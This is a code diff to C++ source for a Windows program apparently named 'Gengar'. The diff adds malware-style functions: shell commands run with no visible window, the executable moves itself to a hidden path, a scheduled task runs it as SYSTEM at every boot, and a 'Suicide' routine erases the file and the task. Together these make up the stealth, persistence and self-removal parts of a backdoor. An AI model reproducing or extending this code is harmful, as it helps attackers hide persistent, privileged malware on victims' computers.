@@ -1,13 +1,21 @@
 #include <sstream>
 #include <boost/process.hpp>
+#include <boost/process/windows.hpp>
 #include "machine.h"
+#include "config.h"
 
 namespace bp = boost::process;
-const std::string TASK_NAME = "Gengar";
-
 std::string quotify(std::string str)
 {
 	return '"' + str + '"';
+}
+
+std::string GetGengarPath()
+{
+	const short buff_size = 128;
+	char exe_path[buff_size];
+	GetModuleFileNameA(nullptr, exe_path, buff_size);
+	return exe_path;
 }
 
 void ReadStream(bp::ipstream& stream, std::string& output)
@@ -27,7 +35,7 @@ std::string Machine::RunShellCommand(std::string cmd)
 	std::string output;
 	bp::ipstream out_stream, err_stream;
 
-	bp::system("cmd /c " + cmd, bp::std_out > out_stream, bp::std_err > err_stream);
+	bp::system("cmd /c " + cmd, bp::std_out > out_stream, bp::std_err > err_stream, bp::windows::create_no_window);
 	ReadStream(out_stream, output);
 	ReadStream(err_stream, output);
 	return output;
@@ -35,17 +43,35 @@ std::string Machine::RunShellCommand(std::string cmd)
 
 void Machine::Persist()
 {
-	std::ostringstream cmd;
-	const short buff_size = 128;
-	char exe_path[buff_size];
+	MoveGengarToHiddenPath();
+	ScheduleGengarOnBoot();
+}
 
-	GetModuleFileNameA(nullptr, exe_path, buff_size);
-	cmd << "schtasks /Create /F /RU SYSTEM /SC ONSTART /TN " << quotify(TASK_NAME) << " /TR " << quotify(exe_path);
-	RunShellCommand(cmd.str());
+void Machine::MoveGengarToHiddenPath()
+{
+	MoveFileA(GetGengarPath().c_str(), GENGAR_PATH.c_str());
+}
+
+void Machine::ScheduleGengarOnBoot()
+{
+	std::string cmd = "schtasks /Create /F /RU SYSTEM /SC ONSTART /TN " + quotify(TASK_NAME) + " /TR " + quotify(GENGAR_PATH);
+	RunShellCommand(cmd);
+}
+
+void Machine::DeleteGengar()
+{
+	DeleteFileA(GENGAR_PATH.c_str());
+}
+
+void Machine::DeleteGengarSchedule()
+{
+	std::string cmd = "schtasks /Delete /F /TN " + quotify(TASK_NAME);
+	RunShellCommand(cmd);
 }
 
 void Machine::Suicide()
 {
-	RunShellCommand("schtasks /Delete /F /TN " + TASK_NAME);
+	DeleteGengar();
+	DeleteGengarSchedule();
 	std::exit(0);
 }
